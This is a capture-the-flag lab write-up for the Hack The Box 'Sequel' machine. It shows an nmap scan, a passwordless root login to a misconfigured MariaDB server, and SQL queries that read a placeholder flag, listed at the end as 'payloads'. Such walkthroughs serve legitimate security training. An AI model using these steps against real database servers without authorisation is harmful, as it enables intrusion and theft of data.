
## 🧩 HTB Starting Point: Sequel  
**Level**: Very Easy  
**Date**: July 30, 2025  
**Goal**: Exploit a misconfigured MariaDB server with root access to retrieve the flag.

---

### 🧰 Tools  
- `nmap`  
- `mysql` client  

---

### 🧭 Steps  

1. 🔎 **Scan the machine** using a fast port scan:
   ```bash
   nmap -F 10.129.X.X
   ```

---

2. 🔐 **Login as root to MySQL** without a password:
   ```bash
   mysql -u root -h 10.129.X.X --skip-ssl
   ```

---

✅ You’re now inside MariaDB as the root user.

---

3. 📚 **Check available databases**:
   ```bash
   SHOW DATABASES;
   ```

---

### Output
```bash
information_schema  
htb  
```

---

4. 📂 **Select the target database**:
   ```bash
   USE htb;
   ```

---

5. 📑 **List the tables**:
   ```bash
   SHOW TABLES;
   ```

---

### Output
```bash
config  
users  
```

---

6. 🏁 **Extract the flag from the config table**:
   ```bash
   SELECT * FROM config;
   ```

---

### Output
```bash
+----+--------------------------+  
| id | value                    |  
+----+--------------------------+  
| 6  | {example_flag_value} |  
+----+--------------------------+  
```

---

✅ Copy the flag and submit it!

---

### 💣 Payloads Used  
```bash
nmap -F 10.129.X.X  
mysql -u root -h 10.129.X.X --skip-ssl  
SHOW DATABASES;  
USE htb;  
SHOW TABLES;  
SELECT * FROM config;
```
